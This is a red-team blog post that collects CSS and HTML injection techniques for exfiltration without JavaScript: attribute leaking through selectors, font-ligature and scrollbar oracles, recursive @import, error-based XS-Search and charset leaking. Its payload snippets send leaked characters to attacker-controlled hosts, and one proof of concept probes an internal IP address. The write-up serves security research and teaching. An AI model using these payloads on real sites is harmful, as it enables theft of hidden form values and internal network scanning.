---
layout: post
title: CSS Injection Primitives
date: 2019-10-16 01:00:00
categories: posts
en: true
description: Collection of CSS / HTML primitives. Tricks to use as an alternative to JavaScript (exfiltration, timing, etc.)
keywords: "CSS Injection, HTML Injection, RedTeam, Red Team, XSLeak, Font-range, exfiltration, scriptless, css recursive import"
authors:
    - X-C3LL
---
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
__Last Update:__ 2019-12-04

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The intention of this post is to document techniques and tricks that can be used as an alternative to JavaScript in the context of an injection. It is just a recopilation that I will be updating every few months (or at least I gonna try it...). Maybe this kind of recopilation is not useful for the majority of the mortals but I find interesting to "preserve" this information all together. All of them are well-known techniques, nothing fancy here. If you know more primitives please ping me at twitter ([@TheXC3LL](https://twitter.com/TheXC3LL)) so I can add them.


## Exfiltration and ping back
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
__Reference:__ [HTTP Leaks](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In order to exfiltrate information we can rely on any of the well-known features that trigger an HTTP request to a server controlled by us. Specially we are intersted in those that are CSS related (@import, background, etc.). This will be the keystone to the rest of the tricks.

## HTML attribute exfiltration
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
__Reference:__ [The Sexy Assassin Tactical Exploitation using CSS](https://slideplayer.com/slide/3493669/), [Exfiltration via CSS Injection](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Probably this is the most known attack. It is posible to build an oracle that leaks the value of an attribute via [CSS Selectors](https://www.w3.org/TR/selectors-3/#attribute-selectors). CSS Selectors can be used as an expresion to match an element if that element has an attribute that matches the attribute represented by the attribute selector. The selectors can be used to match a substring inside an attribute, à la regex, so we can abuse this feature in a boolean way to find the value of a target attribute.

As an example, if we have something like `<input value="somevalue" type="text">`, we can do something like:

```css
input[value^="a"] { background: url('http://ourdomain.com/?char1=a'); }
input[value^="b"] { background: url('http://ourdomain.com/?char1=b'); }
...
input[value^="s"] { background: url('http://ourdomain.com/?char1=s'); } // This will trigger a HTTP request to our endpoint
...
input[value^="z"] { background: url('http://ourdomain.com/?char1=z'); }
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The __value^=X__ expresion matches any element that contains an attribute "value" which _value_ starts with the prefix __X__. So when all the CSS rules are evaluted, the selector __value^="s"__ will match our target element and trigger the HTTP request to our endpoint, leaking the first char. Then we need to repeat the process with __value^=sX__ to extract the second char, then __value^=soX__ and so on. This can be improved significally if we determine the charset first. In this example only the chars "s,o,m,e,v,a,l,u,e" are used ( 9 vs the size of the whole potential charset) so we can reduce the number of "rules" needed in order to leak the whole string. This can be accomplished via __value*=X__, where __X__ matches any string which contains __X__. Pregenerate selectors that matches all the whole potential charset, then reuse only the ones that matched.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Usually the juicy information is inside inputs elements of type __hidden__. This kind of elements are not rendered by the browser, so (most)browsers no need to retrieve external resources for the element (which is the method used by us to leak the info). This problem can be solved with [CSS combinators](https://www.w3.org/TR/selectors-3/#combinators). 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Using the subsequent-sibling combinator (__~__) it is possible to represent the elements between two selectors. This way we can craft a rule like `input[value^=a] ~ *` that can be translated (roughly) as "elements that are between an input with a value that starts with "a" and anything that share the same parent". 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
To perform this attack we need to update the ruleset to match the next char in each iteration. A shabby approach can be the use of `<meta-refresh...>`. A better idea can be the combination of this attack with CSS import recursion (this technique will be discussed later).

## Text node exfiltration (I): ligatures 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
__Reference:__ [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We can extract the text contained in a node with a technique that combines font ligatures and the detection of width changes. The main idea behind this technique is the creation of fonts that contains a predefined ligature with high size and the usage of size changes as oracle.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The fonts can be created as SVG fonts and then converted to woff with fontforge. In SVG we can define the width of a glyph via __horiz-adv-x__ attribute, so we can build something like `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, being XY a sequence of two chars. If the sequence exists, it will be rendered and the size of the text will change. But... how can we detect these changes?

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
When the attribute white-space is defined as __nowrap__ it forces the text to do not break when it exceeds the parent's width. In this situation, an horizontal scrollbar will appear. And we can define the style of that scrollbar, so we can leak when this happens __:)__

```css
body { white-space: nowrap }; 
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://ourendpoint.com/?leak); }
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
At this point the attack is clear: 
1. Create fonts for the combination of two chars with huge width
2. Detect the leak via the scrollbar trick
3. Using the first ligature leaked as base, create new combinations of 3 chars (adding before / after chars)
4. Detect the 3-chars ligature.
5. Repeat until leaking the whole text


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We still needing a improved method to start the iteration because `<meta refresh=...` is suboptimal. CSS recursive imports is our savior!

## CSS Recursive import
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
__Reference:__ [PoC for leaking text nodes via CSS injection by @cgvwzq](https://github.com/cgvwzq/css-scrollbar-attack/)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
To avoid hardcoding all the steps in the payload (that would be overkill) -or using limited tricks like meta-refresh / iframes- we can use CSS recursive imports. In CSS we can import more rules from external style sheets with the `@import` CSS at-rule. Browsers will try to reach the external resource to get the CSS rules and apply them to format the website. But... what happens when the request to the external style sheet takes too long? That the browser processes the rules settled in the main CSS and when it manages to load the external style sheet those rules will be applied. 


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
This behaviour can be abused in order to generate custom CSS rules on the fly. In our injection we can use an import to a style sheet hosted in our server, and this CSS will contain an import to another CSS owned by us plus the rules to leak the first chars (in attributes or in text nodes). The server response to the import will be delayed until we got the leaked char. When we known the first char we can build the custom CSS rules needed to leak the next char and deliver the file (the file will contain another import too, so we can repeat again the process).


## Error-based XS-Search (alternative to onerror)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
__Reference:__ [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
This trick is an alternative to onerror. Basically the main idea is to use a custom font from an endpoint controlled by us in an text that will be showed only if the resource can not be loaded. 

```html
<!DOCTYPE html>
<html>
<head>
    <style>
    @font-face{
        font-family: poc; 
        src: url(http://ourenpoint.com/?leak); 
        unicode-range:U+0041;
    }

    #poc0{
        font-family: 'poc';
    }

    </style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We can abuse this technique for example to build a network scanner (to scan webs hosted in the internal network, even fingerprint well-known web platforms).


## Text node exfiltration (II): leaking the charset with a default font
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
__Reference:__ [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
This trick was released in this [Slackers thread](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). The charset used in a text node can be leaked using the default fonts intalled in the browser: no external -or custom- fonts are needed. The PoC linked as reference is well commented, so we are just going to highlight some points in a human-readable way __;-)__.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The key is to use an animation to grow the div width from 0 to the end of the text, the size of a char each time. Doing this we can "split" the text in two parts: a "prefix" (the first line) and a "suffix", so every time the div increases its width a new char moves from the "suffix" to the "prefix". Something like:

__C__<br>ADB

__CA__<br>DB

__CAD__<br>B

__CADB__

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
When a new char goes to the first line, the unicode-range trick is used to detect the new character in the prefix. This detection is made changing the font to Comic Sans, which its heigth is superior so a vertical scrollbar is triggered (leaking the char value). This way we can leak every different character one time. __We can detect if a character is repated but not what character is repeated__.



## Final words
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
As I said before I want to keep this collection updated. If you know more tricks, please feel free to ping me at twitter ([@TheXC3LL](https://twitter.com/TheXC3LL)) so I can add them to the list.
